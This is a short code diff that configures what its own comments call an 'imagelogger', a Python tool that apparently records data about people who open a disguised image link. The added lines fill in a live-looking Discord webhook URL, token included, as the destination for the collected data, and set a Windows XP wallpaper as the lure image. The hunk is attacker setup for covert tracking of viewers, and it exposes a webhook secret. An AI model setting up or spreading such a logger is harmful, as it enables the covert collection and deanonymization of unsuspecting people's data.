@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discordapp.com/api/webhooks/1342597009198022687/0d1jS1f0jS82qcKCESB2O8al0DWNOhCxZh_5-V3fzXqQIpxd9jFsDcMkQN9b1KjMO2zc",
+    "image": "https://www.google.com/imgres?q=bliss&imgurl=https%3A%2F%2Fwww.pcworld.com%2Fwp-content%2Fuploads%2F2023%2F04%2FWindows-XP-Bliss-desktop-large.png&imgrefurl=https%3A%2F%2Fwww.pcworld.com%2Farticle%2F444752%2Fthe-story-behind-the-windows-xp-bliss-photo-and-what-it-looks-like-today.html&docid=TG4P3fS7yC9-JM&tbnid=D5YZDvbFT1WuCM&vet=12ahUKEwjK0-LG0NWLAxX3D1kFHZtdGFgQM3oECFMQAA..i&w=1201&h=899&hcb=2&ved=2ahUKEwjK0-LG0NWLAxX3D1kFHZtdGFgQM3oECFMQAA", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
